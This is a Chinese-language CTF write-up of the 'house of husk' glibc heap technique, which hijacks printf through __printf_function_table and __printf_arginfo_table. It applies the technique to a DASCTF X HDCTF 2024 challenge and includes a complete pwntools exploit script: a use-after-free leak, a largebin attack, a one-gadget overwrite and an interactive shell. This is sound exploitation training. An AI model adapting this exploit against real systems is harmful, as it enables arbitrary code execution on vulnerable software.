堆题使用_exit()退出程序，且存在printf并且使用了格式化字符，只能任意写堆地址。使用house of husk，通过一次任意地址写（任何非零值都可以），一次任意地址写可控地址，即可任意执行。

printf函数的一个功能是，可以允许用户自定义格式化字符所使用的函数。
如果用户使用__register_printf_specifier函数自定义某格式化字符对应的函数，就会在__printf_arginfo_table处calloc一块内存用于存放用户自定义的格式化字符函数表，表中每一个函数指针对应每一个ascii字符（格式化字符）所使用的自定义函数。
同时将__printf_function_table置为__printf_arginfo_table + UCHAR_MAX + 1

在调用printf时，会检测__printf_function_table是否为零。
若非零则代表用户自定义了格式化字符函数。
此时，程序会转而调用__printf_arginfo_table对应偏移处的函数。

于是利用思路就很明确了。
一次任意写将__printf_function_table置为任意非零值。
一次任意写将__printf_arginfo_table写为可控地址。
可控地址对应偏移处写上目标执行地址（其实正常堆题把chunk填满就行了）。
随后调用带格式化参数的printf，即可任意地址执行。

例题：[DASCTF X HDCTF 2024 最喜欢的一集](https://github.com/Seg-Tree/seg-tree.github.io/blob/main/pwn/DASCTF%20X%20HDCTF%202024%20%E6%9C%80%E5%96%9C%E6%AC%A2%E7%9A%84%E4%B8%80%E9%9B%86%EF%BC%9Ahouse%20of%20husk/pwn_4.7z)

远程环境：glibc-2.31-0ubuntu9.15_amd64
exp环境：glibc-2.31-0ubuntu9.16_amd64

一个uaf，一次edit，一次show，限制chunk 0x500~0x540，一次backdoor任意写一字符。
放进unsortedbin两个chunk，show uaf_chunk拿libc和heap。
largebin attack写在__printf_arginfo_table上。
backdoor写在__printf_function_table上。
输入非法字符退出，调用printf，getshell。

exp：
```python
from pwn import*
p = process("./pwn")
libc = ELF("./libc-2.31.so")
def add(siz,cot):
    p.sendlineafter("choice: \n","1")
    p.sendlineafter("name: ","Seg_Tree")
    p.sendlineafter("desciption: ",str(siz))
    p.sendlineafter("desciption: ",cot)

def fre(idx):
    p.sendlineafter("choice: \n","2")
    p.sendlineafter("people: ",str(idx))

def edi(idx,cot):
    p.sendlineafter("choice: \n","3")
    p.sendlineafter("people: ",str(idx))
    p.sendlineafter("people: ","Seg_Tree")
    p.sendlineafter("desciption: ",cot)

def sho(idx):
    p.sendlineafter("choice: \n","4")
    p.sendlineafter("people: ",str(idx))

def backdoor(addr,char):
    p.sendlineafter("choice: \n","255")
    p.sendlineafter("IU?\n","y")
    p.sendafter("reward!\n",addr)
    p.sendline(char)

add(0x520,"AAAAAAAA")           #0
add(0x510,"BBBBBBBB")           #1
add(0x500,"CCCCCCCC")           #2
add(0x510,"DDDDDDDD")           #3
fre(0)
fre(2)
sho(0)
unsortedbin = u64(p.recv(8))
libc_base = unsortedbin - 0x1Ecbe0
largebin = libc_base + 0x1ed010
print(hex(libc_base))
heap2 = u64(p.recv(8))
heap0 = heap2 - 0xa50
print(hex(heap0))
system = libc_base + libc.symbols["system"]
__printf_function_table = libc_base + 0x1F1318
__printf_arginfo_table = libc_base + 0x1ED7B0
ogg = libc_base + 0xe3afe
ogg = libc_base + 0xe3b01
print(hex(__printf_arginfo_table))
backdoor(p64(__printf_function_table),'a')

fake_table = p64(ogg)*0x80
payload = p64(largebin) + p64(largebin) + p64(heap0) + p64(__printf_arginfo_table - 0x20)

add(0x500,fake_table)           #4/former 2
fre(2)
edi(0,payload)
add(0x530,"put the unsorted chunk into large bin")          ##4
# fre(4)
# gdb.attach(p,"b*$rebase(0x1d98)")
p.sendlineafter("choice: \n","H4cked_6y_Seg_Tree")
p.interactive()
```
做的时候以为全程总共只能分配6个chunk，free之后也没法回收，所以苦恼了好一会风水，最大程度精简了exp使用的chunk。然后才发现压根没这限制（（
